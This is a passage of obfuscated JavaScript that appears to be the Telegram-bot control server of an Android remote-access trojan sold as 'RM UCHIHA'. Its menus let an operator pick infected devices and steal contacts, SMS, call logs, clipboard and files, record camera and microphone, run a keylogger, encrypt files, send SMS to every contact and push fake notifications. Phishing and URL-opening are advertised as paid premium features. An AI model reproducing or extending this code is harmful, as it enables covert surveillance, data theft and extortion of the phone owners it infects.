                                  ],
                                  'resize_keyboard': true,
                                  'one_time_keyboard': true
                                }
                              });
                            }
                            if (_0xdbde0c.text === "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯") {
                              appData.set(actKey, "textToAllContacts");
                              bot.sendMessage(chatId, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 𝚊𝚕𝚕 𝚝𝚊𝚛𝚐𝚎𝚝 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 👁️‍🗨️</b>" + DISCLAIMER, {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]
                                  ],
                                  'resize_keyboard': true,
                                  'one_time_keyboard': true
                                }
                              });
                            }
                            if (_0xdbde0c.text === "✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯") {
                              appData.set(actKey, "notificationText");
                              bot.sendMessage(chatId, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚊𝚜 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 👁️‍🗨️</b>" + DISCLAIMER, {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]
                                  ],
                                  'resize_keyboard': true,
                                  'one_time_keyboard': true
                                }
                              });
                            }
                            if (_0xdbde0c.text === "✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯") {
                              bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy RM UCHIHA 🩸</b>" + DISCLAIMER, {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
                                    ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
                                  ],
                                  'resize_keyboard': true
                                }
                              });
                            }
                            if (_0xdbde0c.text === "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯") {
                              bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy RM UCHIHA 🩸</b>" + DISCLAIMER, {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
                                    ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
                                  ],
                                  'resize_keyboard': true
                                }
                              });
                            }
                            if (_0xdbde0c.text === "✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯") {
                              bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy RM UCHIHA 🩸</b>" + DISCLAIMER, {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
                                    ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
                                  ],
                                  'resize_keyboard': true
                                }
                              });
                            }
                          } else {
                            io.sockets.sockets.forEach((_0x22a16b, _0x30e015, _0x5acd93) => {
                              if (_0xdbde0c.text === _0x22a16b.model) {
                                if (_0x22a16b.chatId == chatId && _0x22a16b.botName == activeBot) {
                                    appData.set(tarKey, _0x30e015);
                                    bot.sendMessage(chatId, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 " + _0x22a16b.model + " 🩸</b>\n\n", {
                                      'parse_mode': "HTML",
                                      'reply_markup': {
                                        'keyboard': [
                                          ["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"], 
                                          ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯"], 
                                          ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"], 
                                          ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯"], 
                                          ["✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯"], 
                                          ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"], 
                                          ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"], 
                                          ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"], 
                                          ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"], 
                                          ["✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"], 
                                          ["✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"], 
                                          ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯"], 
                                          ["✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯"], 
                                          ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]
                                        ],
                                        'resize_keyboard': true,
                                        'one_time_keyboard': true
                                      }
                                    });
                                }
                              }
                            });
                            if (_0xdbde0c.text == "✯ 𝙰𝚕𝚕 ✯") {
                              appData.set(tarKey, "all");
                              bot.sendMessage(chatId, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 🩸</b>\n\n", {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"], 
                                    ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯"], 
                                    ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"], 
                                    ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯"], 
                                    ["✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯"], 
                                    ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"], 
                                    ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"], 
                                    ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"], 
                                    ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"], 
                                    ["✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"], 
                                    ["✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"], 
                                    ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯"], 
                                    ["✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯"], 
                                    ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]
                                  ],
                                  'resize_keyboard': true,
                                  'one_time_keyboard': true
                                }
                              });
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
});

setInterval(() => {
  io.sockets.sockets.forEach((_0x107f46, _0x316932, _0x1f46f7) => {
    io.to(_0x316932).emit("ping", {});
  });
}, 0x1388);

setInterval(() => {
  https.get(data.host || BASE_URL, _0x9df260 => {}).on("error", _0x26bc04 => {});
}, 0x75300);

server.listen(process.env.PORT || 3000, () => {
  console.log("listening on port 3000");
});
